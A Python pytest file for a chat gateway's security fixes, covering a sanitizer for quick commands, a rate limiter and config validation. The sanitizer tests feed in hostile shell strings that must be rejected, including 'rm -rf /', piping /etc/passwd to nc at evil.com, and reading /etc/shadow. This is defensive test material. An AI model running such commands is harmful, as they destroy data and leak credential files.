"""Tests for shell injection prevention in quick commands and subprocess calls.

TDD: These tests define the expected behavior BEFORE the fix is applied.
The fix should make exec commands use shlex.split() instead of shell=True.
"""

import shlex
import subprocess
from unittest.mock import MagicMock, patch

import pytest


class TestQuickCommandSanitization:
    """Test that quick commands from config are not vulnerable to shell injection."""

    def test_safe_command_executes_normally(self):
        """A simple safe command should work fine."""
        from gateway.config import sanitize_quick_command
        cmd = "echo hello"
        result = sanitize_quick_command(cmd)
        assert result is not None
        assert isinstance(result, list)

    def test_semicolon_injection_blocked(self):
        """Commands with shell metacharacters should be rejected."""
        from gateway.config import sanitize_quick_command
        cmd = "echo hello; rm -rf /"
        result = sanitize_quick_command(cmd)
        assert result is None

    def test_pipe_injection_blocked(self):
        """Pipe characters should be rejected in quick commands."""
        from gateway.config import sanitize_quick_command
        cmd = "cat /etc/passwd | nc evil.com 1234"
        result = sanitize_quick_command(cmd)
        assert result is None

    def test_backtick_injection_blocked(self):
        """Backtick command substitution should be rejected."""
        from gateway.config import sanitize_quick_command
        cmd = "echo `whoami`"
        result = sanitize_quick_command(cmd)
        assert result is None

    def test_dollar_paren_injection_blocked(self):
        """$() command substitution should be rejected."""
        from gateway.config import sanitize_quick_command
        cmd = "echo $(cat /etc/shadow)"
        result = sanitize_quick_command(cmd)
        assert result is None

    def test_ampersand_injection_blocked(self):
        """Background operator & should be rejected."""
        from gateway.config import sanitize_quick_command
        cmd = "malicious_command &"
        result = sanitize_quick_command(cmd)
        assert result is None

    def test_redirect_injection_blocked(self):
        """Output redirection should be rejected."""
        from gateway.config import sanitize_quick_command
        cmd = "echo secrets > /tmp/stolen"
        result = sanitize_quick_command(cmd)
        assert result is None

    def test_empty_command_rejected(self):
        """Empty commands should return None."""
        from gateway.config import sanitize_quick_command
        assert sanitize_quick_command("") is None
        assert sanitize_quick_command("   ") is None

    def test_safe_command_with_args(self):
        """Commands with normal arguments should be allowed."""
        from gateway.config import sanitize_quick_command
        cmd = "git status --short"
        result = sanitize_quick_command(cmd)
        assert result == ["git", "status", "--short"]

    def test_safe_command_with_quoted_args(self):
        """Commands with quoted arguments should be parsed correctly."""
        from gateway.config import sanitize_quick_command
        cmd = 'grep "hello world" file.txt'
        result = sanitize_quick_command(cmd)
        assert result == ["grep", "hello world", "file.txt"]


class TestRateLimiter:
    """Tests for the gateway rate limiter."""

    def test_allows_messages_under_limit(self):
        """Messages under the rate limit should be allowed."""
        from gateway.rate_limiter import RateLimiter
        limiter = RateLimiter(max_messages=5, window_seconds=60)
        for _ in range(5):
            assert limiter.allow("user123") is True

    def test_blocks_messages_over_limit(self):
        """Messages exceeding the rate limit should be blocked."""
        from gateway.rate_limiter import RateLimiter
        limiter = RateLimiter(max_messages=3, window_seconds=60)
        for _ in range(3):
            assert limiter.allow("user123") is True
        assert limiter.allow("user123") is False

    def test_different_users_independent(self):
        """Each user should have their own rate limit."""
        from gateway.rate_limiter import RateLimiter
        limiter = RateLimiter(max_messages=2, window_seconds=60)
        assert limiter.allow("user_a") is True
        assert limiter.allow("user_a") is True
        assert limiter.allow("user_a") is False
        # Different user should still be allowed
        assert limiter.allow("user_b") is True

    def test_window_expiry_allows_again(self):
        """After the window expires, messages should be allowed again."""
        import time
        from gateway.rate_limiter import RateLimiter
        limiter = RateLimiter(max_messages=1, window_seconds=0.1)
        assert limiter.allow("user123") is True
        assert limiter.allow("user123") is False
        time.sleep(0.15)
        assert limiter.allow("user123") is True

    def test_remaining_count(self):
        """Should report remaining message count correctly."""
        from gateway.rate_limiter import RateLimiter
        limiter = RateLimiter(max_messages=5, window_seconds=60)
        assert limiter.remaining("user123") == 5
        limiter.allow("user123")
        assert limiter.remaining("user123") == 4


class TestConfigValidation:
    """Tests for fail-fast config validation."""

    def test_valid_config_passes(self):
        """A well-formed config should validate without errors."""
        from gateway.config import validate_gateway_config, GatewayConfig
        config = GatewayConfig()
        errors = validate_gateway_config(config)
        assert errors == []

    def test_invalid_reset_hour_fails(self):
        """at_hour outside 0-23 should produce a validation error."""
        from gateway.config import validate_gateway_config, GatewayConfig, SessionResetPolicy
        config = GatewayConfig(
            default_reset_policy=SessionResetPolicy(at_hour=25)
        )
        errors = validate_gateway_config(config)
        assert any("at_hour" in e for e in errors)

    def test_negative_idle_minutes_fails(self):
        """Negative idle_minutes should produce a validation error."""
        from gateway.config import validate_gateway_config, GatewayConfig, SessionResetPolicy
        config = GatewayConfig(
            default_reset_policy=SessionResetPolicy(idle_minutes=-1)
        )
        errors = validate_gateway_config(config)
        assert any("idle_minutes" in e for e in errors)

    def test_invalid_reset_mode_fails(self):
        """An invalid session reset mode should produce a validation error."""
        from gateway.config import validate_gateway_config, GatewayConfig, SessionResetPolicy
        config = GatewayConfig(
            default_reset_policy=SessionResetPolicy(mode="invalid_mode")
        )
        errors = validate_gateway_config(config)
        assert any("mode" in e for e in errors)

    def test_enabled_platform_without_token_warns(self):
        """An enabled platform without a token should produce a warning."""
        from gateway.config import (
            validate_gateway_config, GatewayConfig,
            PlatformConfig, Platform,
        )
        config = GatewayConfig(
            platforms={
                Platform.TELEGRAM: PlatformConfig(enabled=True, token="")
            }
        )
        errors = validate_gateway_config(config)
        assert any("token" in e.lower() or "telegram" in e.lower() for e in errors)
